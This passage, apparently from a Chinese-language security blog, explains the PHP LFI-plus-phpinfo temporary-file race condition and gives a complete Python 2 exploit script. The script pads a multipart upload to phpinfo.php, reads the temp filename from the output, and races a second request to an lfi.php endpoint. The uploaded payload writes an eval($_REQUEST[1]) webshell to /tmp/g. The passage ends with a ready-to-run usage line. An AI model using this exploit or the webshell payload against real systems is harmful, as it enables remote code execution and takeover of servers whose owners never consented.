<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
<p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
<p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
<p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
<p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
<p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
<p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(<span class="built_in">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 exp.py your-ip 8080 100</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
</search>
